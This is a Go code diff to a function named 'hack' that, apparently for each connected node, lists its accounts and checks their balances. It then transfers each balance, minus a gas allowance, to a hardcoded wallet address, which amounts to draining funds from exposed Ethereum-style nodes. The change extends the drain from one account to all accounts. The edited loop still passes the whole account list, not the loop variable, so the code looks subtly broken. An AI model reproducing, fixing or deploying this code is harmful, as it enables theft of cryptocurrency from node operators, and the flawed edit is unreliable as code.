@@ -219,15 +219,18 @@ func (pxy *proxy) hack(addr string) {
 			fmt.Println("addrport GetAccounts:", err)
 			continue
 		}
-		balance, err := r.GetBalance(acc)
-		if err != nil {
-			fmt.Println("addrport GetBalance:", err)
-			continue
+		for _, ac := range acc {
+			balance, err := r.GetBalance(ac)
+			if err != nil {
+				fmt.Println("addrport GetBalance:", err)
+				continue
+			}
+			if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
+				b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
+				r.SendTransaction(acc, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
+			}
 		}
-		if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
-			b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
-			r.SendTransaction(acc, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
-		}
+
 	}
 	pxy.allPeer[addr] = true
 }
